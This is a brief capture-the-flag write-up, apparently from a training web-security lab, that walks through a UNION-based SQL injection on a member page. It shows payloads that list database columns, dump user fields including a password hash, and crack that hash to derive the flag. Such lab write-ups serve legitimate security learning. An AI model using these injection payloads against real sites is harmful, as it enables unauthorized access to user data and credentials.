### SQL injection on member page

This injection prints all the columns of all tables (without the tables):

`1=1 UNION SELECT NULL, column_name FROM information_schema.columns`

So, we could see all the columns of the users table -> surname, first_name, commentaire, countersign planet, town...

With this one, it prints the value of the given fields : 

`ID: 1=1 UNION SELECT first_name, countersign FROM users`

So we tried with every fields of the users tables and we found hints to access to the flag

```
ID: 1=1 UNION SELECT commentaire , last_name FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : GetThe
```

the countersign value is 5ff9d0165b4f92b14994e5c685cdce28

Here we go : 5ff9d0165b4f92b14994e5c685cdce28 >> MD5 DCRYPT >> FortyTwo >> lower all char >> fortytwo >> encrypt sh256 = flag
